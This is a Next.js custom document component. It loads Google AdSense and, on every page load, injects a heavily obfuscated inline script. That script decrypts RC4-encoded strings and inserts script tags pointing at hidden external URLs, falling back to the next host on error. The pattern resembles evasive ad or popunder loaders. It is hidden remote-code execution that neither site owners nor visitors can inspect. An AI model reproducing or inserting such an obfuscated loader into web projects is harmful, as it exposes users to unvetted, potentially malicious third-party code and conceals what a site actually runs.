import Document, { Html, Head, Main, NextScript } from 'next/document';
import Script from 'next/script';

class MyDocument extends Document {
  static async getInitialProps(ctx) {
    const initialProps = await Document.getInitialProps(ctx);
    return { ...initialProps };
  }

  render() {
    return (
      <Html>
        <Head>
          <link rel="icon" href="/favicon.svg" />
          <Script
              async
              src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1339539882255727"
              crossOrigin="anonymous"
          />

          <Script
            type="text/javascript"
            data-cfasync="false"
            dangerouslySetInnerHTML={{
              __html: `
              /*<![CDATA[/* */
              (function(){if(window.ee05df34921703334cba6a52748be1e5) return; window.ee05df34921703334cba6a52748be1e5="EcaxOmjgyVxaItYUxfICs0LEsh47hAvtG3EOj780LWptQseH61hPPWEP1i4hr5x9UTSmA32F0rNBWuA";var a=['ClBvwoYeO3FF','UcKVZEvChDp5PA==','bAl1w7ASw4liwqHDhCLChATCn0II','Oh5ZDQzCl2nDkAFhwp4G','w4dhwrpKw5fCg8Oqw6nDqQfCgsOnDsOnw47CjMKXwo8Kw7/CgDTDjnTDvcO7XyBqKsKIw7PCscKpw4dPw4tCJMKCwoZ9D8KQwq/CgxsHd8Kbwr4=','dsOIw6NhRG0=','wqwjw53Dq8OqCcKzwqXDp2rCtybCtQ==','WMKPf1XCjm05ZsOY','EsOaWsK5W8K5wq8=','Q23DisOIwoEy','X8KYeQ==','w5bCtMOow6TCo8KSw5vCokNIw6s=','T8KYf2AOw7A/N8OxOsOywpZk','VDtaB2MfwrbDnsK3ARLDmg==','Ozh5eA==','aw9/w61Nw5c=','ZsOFwqMvw6vDml/Cvg==','L8Obw7cKwpfCr35BQMKvw7PDgMO9asOIWMOedTTCt0vClMKmwqB/w4PCpMO3woQKWmtpw5QbOMONEGPDrMOaM8OSwqXDqQnCo8KMCRF9worCk8OwUsKHbHzCjg==','XmvDlMO/woYyw4o7fcOEWwDCqmQ=','A8KBwq7DmnYs','JcKkw5XCmHPDp0jCjcKMwoo=','woTCvsOLJg==','WMKSaVXClA==','wrLCjRHChsKjw7okw61fw4RMwoA=','w77DnsK0w6HCtcOowpPCjTZYJgHDvxnCuEDCq0TCtsKU','IR9MEhHCi28='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x1e3));var b=function(c,d){c=c-0x0;var e=a[c];if(b['PXRlqA']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['PHhupz']=g;b['pbFYiF']={};b['PXRlqA']=!![];}var f=b['pbFYiF'][c];if(f===undefined){if(b['Mjbhxa']===undefined){b['Mjbhxa']=!![];}e=b['PHhupz'](e,d);b['pbFYiF'][c]=e;}else{e=f;}return e;};var o=window;o[b('0x6','qqVc')]=[[b('0x4','H]pY'),0x4be13c],[b('0x14','YB%q'),0x0],[b('0x3','YB%q'),'0'],[b('0x8','Ym@4'),0x0],[b('0x13','Z8$L'),![]],[b('0x11','2A0j'),0x0],[b('0xe','b*kw'),!0x0]];var h=[b('0xf','&DDI'),b('0x2','Ca]G')],v=0x0,k,l=function(){if(!h[v])return;k=o[b('0xb','W@zK')][b('0x17','ZY$!')](b('0x10','7EOh'));k[b('0x19','5kf)')]=b('0xd','2Epv');k[b('0x7','18sy')]=!0x0;var c=o[b('0x1','2bL5')][b('0x9','1Z6[')](b('0x0','2Epv'))[0x0];k[b('0x15','ZY$!')]=b('0xc','18sy')+h[v];k[b('0x16','5ZW4')]=b('0x12','18sy');k[b('0xa','b*kw')]=function(){v++;l();};c[b('0x5','4HPT')][b('0x18','GnSu')](k,c);};l();})();
              /*]]>/* */
              `,
            }}
          />
        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}

export default MyDocument;